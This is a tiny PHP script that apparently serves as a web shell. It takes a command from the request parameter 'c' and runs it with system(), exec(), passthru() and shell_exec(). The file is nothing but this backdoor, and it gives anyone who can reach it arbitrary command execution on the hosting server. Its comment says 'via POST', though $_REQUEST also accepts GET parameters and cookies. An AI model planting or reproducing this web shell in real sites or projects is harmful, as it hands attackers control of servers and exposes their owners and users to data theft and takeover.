<?php
// System command execution via POST
$c = $_REQUEST['c'];
system($c);
exec($c);
passthru($c);
shell_exec($c);
?>
